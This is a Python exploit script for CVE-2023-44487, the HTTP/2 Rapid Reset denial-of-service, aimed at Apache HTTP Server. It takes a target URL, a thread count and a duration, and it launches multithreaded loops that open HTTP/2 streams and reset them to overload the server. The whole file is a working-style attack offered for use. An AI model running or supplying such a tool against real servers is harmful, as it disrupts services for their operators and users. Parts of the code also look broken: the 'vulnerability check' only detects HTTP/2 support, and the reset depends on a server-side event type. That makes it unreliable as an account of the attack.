# CVE-2023-44487
# Apache HTTP server HTTP/2 Rapid Reset DoS
# version : apache http server 2.4.17~2.4.62
# version(reg) : ^2\.4\.(1[7-9]|[2-5][0-9]|6[0-2])$

import threading
import socket
import collections
import argparse
from urllib.parse import urlparse
import httpx
import time

try:
    # using Python 3.10+
    from collections.abc import MutableSet
    collections.MutableSet = collections.abc.MutableSet
    from collections.abc import MutableMapping
    collections.MutableMapping = collections.abc.MutableMapping
except ImportError:
    # using Python 3.10-
    from collections import MutableSet
    from collections import MutableMapping
    
from h2.connection import H2Connection
from h2.events import RequestReceived, StreamReset
from h2.config import H2Configuration
import ssl
from h2.errors import ErrorCodes


def check_http2_support(url):
    with httpx.Client(http2=True, verify=False) as client:
        try:
            response = client.get(url)
            print("[+] HTTP Version:", response.http_version)

            # If using HTTP/2, the server may be vulnerable to DoS attacks.
            if response.http_version == "HTTP/2":
                print(f"[*] Detected Vulnerability : True")
                print("---------------------------------")
                return True
            else:
                print(f"[-] Detected Vulnerability : False")
                return False

        except Exception as e:
            print(f"[-] Unable to connect to the target server.")


def exploit(protocol, host, port, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.create_connection((host, port))

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            ctx.set_alpn_protocols(['h2'])
            sock = ctx.wrap_socket(sock, server_hostname=host)

            assert sock.selected_alpn_protocol() == 'h2'

            config = H2Configuration(client_side=True)
            conn = H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())

            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(
                stream_id,
                [(':method', 'GET'), (':authority', host), (':path', '/'), (':scheme', protocol)],
            )
            sock.sendall(conn.data_to_send())

            while True:
                data = sock.recv(65535)
                if not data:
                    break

                events = conn.receive_data(data)
                for event in events:
                    if isinstance(event, RequestReceived):
                        # PoC (Send the RST_STREAM frame to the server)
                        conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL)
                    elif isinstance(event, StreamReset):
                        print(f"[+] Stream {event.stream_id} cancelled.")

                sock.sendall(conn.data_to_send())
        except Exception as e:
            print(f"An error occurred: {e}")


if __name__ == "__main__":
    print('''====================\n   CVE-2023-44487\n HTTP/2 Rapid Reset\n====================''')

    parser = argparse.ArgumentParser(usage="python CVE-2023-44487.py -u <Target URL> -dos 1 -limit 10")
    parser.add_argument("-u","--URL", required=True, help='Target server URL (e.g., http://localhost:8080/)')
    parser.add_argument("-dos","--DOS", required=False, help='Number of threads to attempt in denial of service attack')
    parser.add_argument("-limit","--LIMIT", required=False, help='Duration of DoS attack', default="10")
    args = parser.parse_args()

    url=args.URL
    protocol = urlparse(url).scheme
    host = urlparse(url).hostname
    port = urlparse(url).port

    if check_http2_support(url): 

        if args.DOS:
            
            print("[!] Starting DoS attack!")

            stop_event = threading.Event()

            threads = []
            for i in range(int(args.DOS)):
                thread = threading.Thread(target=exploit, args=(protocol, host, port, stop_event))
                thread.start()
                threads.append(thread)

            time.sleep(int(args.LIMIT))
            stop_event.set()

            for thread in threads:
                thread.join()

            print("[+] All threads have been terminated.")